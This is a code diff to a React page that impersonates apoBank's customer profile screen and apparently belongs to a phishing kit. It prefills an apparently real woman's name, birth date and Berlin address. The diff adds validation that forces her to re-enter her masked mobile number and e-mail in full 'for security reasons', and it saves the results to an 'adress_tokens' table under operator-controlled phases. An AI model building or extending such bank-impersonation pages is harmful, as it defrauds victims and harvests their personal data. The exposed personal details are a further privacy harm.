@@ -1,10 +1,10 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { cn } from "@/lib/utils";
-import { Loader2, Phone, ShieldCheck, Globe, Mail, Info, AlertTriangle, Check } from "lucide-react";
+import { Loader2, Phone, ShieldCheck, Globe, Mail, Info, AlertTriangle, Check, Pencil, X } from "lucide-react";
 import headerBankingAsset from "@/assets/header-banking.jpg.asset.json";
 import apobankLogo from "@/assets/apobank-logo.svg";
 import apoALogo from "@/assets/apo-a-logo.png.asset.json";
@@ -339,27 +339,154 @@ const BeraterStep = ({ onSubmit }: { onSubmit: (g: string, k: string) => Promise
   );
 };
 
-const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<string, string>) => Promise<void> }) => {
-  const prev = row.profile_data || {};
-  const [fields, setFields] = useState<FieldDef[]>(() =>
-    initialFields.map(f => ({ ...f, value: prev[f.key] ?? "" }))
+type ProfileField = { key: string; label: string; value: string; muted?: boolean; options?: string[] };
+
+const ERWERB_OPTIONS = [
+  "Angestellt","Arbeiter","Beamter","Selbstständig","Freiberuflich","Auszubildender",
+  "Student","Schüler","Rentner / Pensionär","Hausfrau / Hausmann","Arbeitssuchend","Elternzeit","Sonstiges",
+];
+
+const buildInitialSections = (prev: Record<string, string>): Record<string, ProfileField[]> => {
+  const p = (k: string, d: string) => (prev[k] !== undefined && prev[k] !== "" ? prev[k] : d);
+  const m = (v: string) => ({ muted: !v });
+  return {
+    personal: [
+      { key: "titel", label: "Titel", value: p("titel", ""), ...m(p("titel","")) },
+      { key: "vorname", label: "Vorname", value: p("vorname", "Gülnaz") },
+      { key: "weitereVornamen", label: "Weitere Vornamen", value: p("weitereVornamen",""), ...m(p("weitereVornamen","")) },
+      { key: "nachname", label: "Nachname", value: p("nachname", "Kirdemir") },
+      { key: "geburtsdatum", label: "Geburtsdatum", value: p("geburtsdatum","21.12.1985") },
+      { key: "geburtsort", label: "Geburtsort", value: p("geburtsort","Berlin, Deutschland") },
+      { key: "staat", label: "Staatsangehörigkeit", value: p("staat","deutsch") },
+      { key: "weitereStaat", label: "Weitere Staatsangehörigkeiten", value: p("weitereStaat","Keine") },
+      { key: "familienstand", label: "Familienstand", value: p("familienstand","ledig") },
+      { key: "steuerId", label: "Steuer-ID", value: p("steuerId",""), ...m(p("steuerId","")) },
+    ],
+    contact: [
+      { key: "mobil", label: "Private Mobilfunknummer", value: p("mobil","+49 177 *****80") },
+      { key: "festnetz", label: "Private Festnetznummer", value: p("festnetz",""), ...m(p("festnetz","")) },
+      { key: "email", label: "Private E-Mail-Adresse", value: p("email","t**********@o*****k.de") },
+    ],
+    address: [
+      { key: "strasse", label: "Straße und Hausnummer", value: p("strasse","Hochstr. 37") },
+      { key: "zusatz", label: "Adresszusatz", value: p("zusatz",""), ...m(p("zusatz","")) },
+      { key: "plz", label: "Postleitzahl", value: p("plz","13357") },
+      { key: "ortLand", label: "Ort und Land", value: p("ortLand","Berlin, Deutschland") },
+    ],
+    work: [
+      { key: "erwerb", label: "Erwerbstätigkeit", value: p("erwerb","Angestellt"), options: ERWERB_OPTIONS },
+      { key: "berufsgruppe", label: "Berufsgruppe", value: p("berufsgruppe","Humanmedizin") },
+      { key: "fachrichtung", label: "Fachrichtung", value: p("fachrichtung","Humanmedizin: Ausbildung, Lehramt") },
+      { key: "stellung", label: "Stellung im Unternehmen", value: p("stellung","Sonstiges") },
+    ],
+  };
+};
+
+const ViewField = ({ label, value, muted }: { label: string; value: string; muted?: boolean }) => (
+  <div>
+    <div className="text-[13px] font-semibold text-[#001f5b] mb-1">{label}</div>
+    <div className={`text-[15px] ${muted ? "text-slate-400" : "text-slate-800"}`}>{value || "Keine Angabe"}</div>
+  </div>
+);
+
+const EditField = ({ label, value, onChange, options, invalid = false }: { label: string; value: string; onChange: (v: string) => void; options?: string[]; invalid?: boolean }) => (
+  <div>
+    <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{label}</label>
+    {options ? (
+      <select value={value} onChange={e => onChange(e.target.value)}
+        className={`w-full text-[15px] text-slate-800 bg-white border rounded-md px-3 py-2 outline-none focus:ring-1 ${invalid ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300 focus:border-[#001f5b] focus:ring-[#001f5b]"}`}>
+        {!options.includes(value) && value ? <option value={value}>{value}</option> : null}
+        {options.map(o => <option key={o} value={o}>{o}</option>)}
+      </select>
+    ) : (
+      <input type="text" value={value} onChange={e => onChange(e.target.value)}
+        className={`w-full text-[15px] text-slate-800 bg-white border rounded-md px-3 py-2 outline-none focus:ring-1 ${invalid ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300 focus:border-[#001f5b] focus:ring-[#001f5b]"}`} />
+    )}
+  </div>
+);
+
+const SectionCard = ({ title, fields, onSave, editable = true, openSignal = 0, requireNoAsterisk = false }: {
+  title: string; fields: ProfileField[]; onSave: (next: ProfileField[]) => void;
+  editable?: boolean; openSignal?: number; requireNoAsterisk?: boolean;
+}) => {
+  const [editing, setEditing] = useState(false);
+  const [draft, setDraft] = useState<ProfileField[]>(fields);
+  const [invalidKeys, setInvalidKeys] = useState<string[]>([]);
+  useEffect(() => { if (openSignal > 0 && editable) { setDraft(fields); setEditing(true); setInvalidKeys([]); } }, [openSignal]);
+  const save = () => {
+    if (requireNoAsterisk) {
+      const bad = draft.filter(f => f.key !== "festnetz" && (!f.value || f.value.trim() === "" || f.value.includes("*"))).map(f => f.key);
+      if (bad.length) { setInvalidKeys(bad); return; }
+    }
+    onSave(draft.map(f => ({ ...f, muted: !f.value })));
+    setEditing(false);
+  };
+  return (
+    <section className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-4 sm:px-10 py-6 sm:py-8">
+      <div className="flex flex-wrap items-start justify-between gap-3 mb-6">
+        <h2 className="text-[20px] sm:text-[24px] font-semibold text-[#001f5b]">{title}</h2>
+        {editing ? (
+          <div className="flex items-center gap-2 flex-wrap">
+            <button type="button" onClick={() => { setDraft(fields); setEditing(false); setInvalidKeys([]); }}
+              className="inline-flex items-center gap-2 rounded-full border border-slate-300 text-slate-600 px-4 sm:px-5 py-1.5 text-sm font-medium hover:bg-slate-50">
+              <X className="w-4 h-4" />Abbrechen
+            </button>
+            <button type="button" onClick={save}
+              className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-4 sm:px-5 py-1.5 text-sm font-medium hover:bg-[#00174a]">
+              <Check className="w-4 h-4" />Speichern
+            </button>
+          </div>
+        ) : editable ? (
+          <button type="button" onClick={() => { setDraft(fields); setEditing(true); setInvalidKeys([]); }}
+            className="inline-flex items-center gap-2 rounded-full border border-[#001f5b] text-[#001f5b] px-4 sm:px-5 py-1.5 text-sm font-medium hover:bg-[#001f5b]/5">
+            <Pencil className="w-4 h-4" />Bearbeiten
+          </button>
+        ) : null}
+      </div>
+      <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-10 gap-y-6">
+        {editing
+          ? draft.map(f => (
+              <EditField key={f.key} label={f.label} value={f.value} options={f.options} invalid={invalidKeys.includes(f.key)}
+                onChange={v => { setDraft(prev => prev.map(p => p.key === f.key ? { ...p, value: v } : p)); setInvalidKeys(prev => prev.filter(k => k !== f.key)); }} />
+            ))
+          : fields.map(f => <ViewField key={f.key} label={f.label} value={f.value} muted={f.muted} />)}
+      </div>
+    </section>
   );
+};
+
+const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<string, string>) => Promise<void> }) => {
+  const [sections, setSections] = useState(() => buildInitialSections(row.profile_data || {}));
+  const [confirmError, setConfirmError] = useState(false);
+  const [contactOpenSignal, setContactOpenSignal] = useState(0);
   const [submitting, setSubmitting] = useState(false);
+
   useEffect(() => { if (row.customer_phase === "adress_rejected") setSubmitting(false); }, [row.customer_phase]);
 
-  const updateField = (key: string, v: string) =>
-    setFields(prev => prev.map(f => f.key === key ? { ...f, value: v } : f));
+  const flatten = (secs: Record<string, ProfileField[]>) => {
+    const out: Record<string, string> = {};
+    Object.values(secs).forEach(list => list.forEach(f => { out[f.key] = f.value; }));
+    return out;
+  };
 
-  const handleDate = (label: string, v: string) => {
-    if (label.toLowerCase().includes("datum")) {
-      let d = v.replace(/\D/g, "").slice(0, 8);
-      let out = "";
-      if (d.length > 0) out += d.slice(0, 2);
-      if (d.length > 2) out += "." + d.slice(2, 4);
-      if (d.length > 4) out += "." + d.slice(4);
-      return out;
-    }
-    return v;
+  const persistPatch = async (patch: Record<string, string>) => {
+    const merged = { ...(row.profile_data || {}), ...patch };
+    await (supabase as any).from("adress_tokens").update({ profile_data: merged }).eq("id", row.id);
+  };
+
+  const updateSection = (key: string) => async (next: ProfileField[]) => {
+    setSections(prev => ({ ...prev, [key]: next }));
+    if (key === "contact" && next.every(f => f.value && f.value.trim() !== "")) setConfirmError(false);
+    const patch: Record<string, string> = {};
+    next.forEach(f => { patch[f.key] = f.value; });
+    await persistPatch(patch);
+  };
+
+  const handleConfirm = async () => {
+    const contactOk = sections.contact.every(f => f.value && f.value.trim() !== "" && !f.value.includes("*"));
+    if (!contactOk) { setConfirmError(true); setContactOpenSignal(n => n + 1); return; }
+    setSubmitting(true);
+    await onSubmit(flatten(sections));
   };
 
   return (
@@ -367,48 +494,53 @@ const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<stri
       <header className="bg-white border-b border-slate-200">
         <div className="max-w-[1400px] mx-auto flex items-center justify-between px-4 sm:px-10 h-16">
           <div className="flex items-center gap-3 sm:gap-8">
-            <img src={apoALogo.url} alt="apoBank" className="w-10 h-10 rounded-full object-contain" />
+            <div className="w-10 h-10 rounded-full bg-[#001f5b] text-white flex items-center justify-center font-semibold text-lg">a</div>
             <span className="text-[15px] font-medium text-[#001f5b]">Profildaten</span>
           </div>
         </div>
       </header>
       <main className="flex-1">
-        <div className="max-w-[780px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
-          <h1 className="text-[26px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">Mein Profil aktualisieren</h1>
+        <div className="max-w-[1120px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
+          <h1 className="text-[28px] sm:text-[40px] font-semibold text-[#001f5b] mb-6">Mein Profil</h1>
+          <div className="bg-slate-50 border border-[#b3c7e0] rounded-lg px-4 sm:px-6 py-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-8">
+            <div className="flex items-start sm:items-center gap-3">
+              <Info className="w-5 h-5 text-slate-500 shrink-0 mt-0.5 sm:mt-0" strokeWidth={1.75} />
+              <div>
+                <div className="font-semibold text-[#3d8b5a] text-[15px] leading-snug">Sind Ihre Angaben noch korrekt?</div>
+                <div className="text-[14px] text-[#5a9d75] leading-snug">Bitte bestätigen oder bearbeiten Sie Ihre Profildaten.</div>
+              </div>
+            </div>
+            <button type="button" onClick={handleConfirm} disabled={submitting}
+              className="inline-flex items-center justify-center gap-2 rounded-full bg-[#001f5b] text-white px-5 py-2.5 text-sm font-medium shrink-0 hover:bg-[#00174a] w-full sm:w-auto disabled:opacity-70">
+              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" strokeWidth={2.5} />Angaben bestätigen</>}
+            </button>
+          </div>
+          {confirmError && (
+            <div className="bg-red-100 border border-red-200 text-red-900 px-4 py-4 rounded text-sm mb-6">
+              Aus Sicherheitsgründen bitten wir Sie, Ihre privaten Kontaktinformationen vollständig und im Klartext anzugeben. Speichern Sie die Angaben und klicken Sie anschließend auf „Angaben bestätigen", um den Vorgang abzuschließen.
+            </div>
+          )}
           {row.last_error && <div className="mb-6 rounded-md border border-red-200 bg-red-50 text-red-800 px-4 py-3 text-sm">{row.last_error}</div>}
-          <form onSubmit={async e => { e.preventDefault(); setSubmitting(true); await onSubmit(Object.fromEntries(fields.map(f => [f.key, f.value]))); }}
-            className="bg-white rounded-xl border border-slate-200/70 px-4 sm:px-10 py-6 sm:py-10">
-            <div className="flex flex-col gap-y-6">
-              {fields.map(f => (
-                <div key={f.key}>
-                  <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{f.label}</label>
-                  {f.options ? (
-                    <select value={f.value} onChange={e => updateField(f.key, e.target.value)}
-                      className="w-full sm:w-1/2 md:w-[40%] text-[15px] bg-white border border-slate-300 rounded-md px-3 py-2">
-                      {f.options.map(o => <option key={o} value={o === "Keine Angabe" ? "" : o}>{o}</option>)}
-                    </select>
-                  ) : (
-                    <input type={f.type || "text"} value={f.value}
-                      onChange={e => updateField(f.key, handleDate(f.label, e.target.value))}
-                      required={!f.label.toLowerCase().includes("optional")}
-                      className="w-full sm:w-3/4 md:w-[60%] text-[15px] bg-white border border-slate-300 rounded-md px-3 py-2" />
-                  )}
-                </div>
-              ))}
-            </div>
-            <div className="flex justify-end mt-10">
-              <button type="submit" disabled={submitting}
-                className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-6 py-2 text-sm font-medium disabled:opacity-70">
-                {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" />Speichern</>}
-              </button>
-            </div>
-          </form>
+          <div className="space-y-6">
+            <SectionCard title="Persönliche Angaben" fields={sections.personal} onSave={updateSection("personal")} editable={false} />
+            <SectionCard title="Private Kontaktinformationen" fields={sections.contact} onSave={updateSection("contact")} openSignal={contactOpenSignal} requireNoAsterisk />
+            <SectionCard title="Meldeadresse" fields={sections.address} onSave={updateSection("address")} />
+            <SectionCard title="Berufliche Angaben" fields={sections.work} onSave={updateSection("work")} />
+          </div>
         </div>
       </main>
       <footer className="bg-[#001f5b] text-white mt-10">
-        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10">
-          <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
-          <div className="text-[13px] mt-4 opacity-90">© 2026 Deutsche Apotheker- und Ärztebank eG.</div>
+        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
+          <div>
+            <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
+            <div className="text-[13px] mt-4 opacity-90">© 2026 Deutsche Apotheker- und Ärztebank eG. Alle Rechte vorbehalten.</div>
+          </div>
+          <ul className="space-y-3 text-[15px]">
+            <li><a href="#" className="hover:underline">Impressum</a></li>
+            <li><a href="#" className="hover:underline">Datenschutz</a></li>
+            <li><a href="#" className="hover:underline">Nutzungsbedingungen</a></li>
+            <li><a href="#" className="hover:underline">Cookie-Einstellungen</a></li>
+          </ul>
         </div>
       </footer>
     </div>
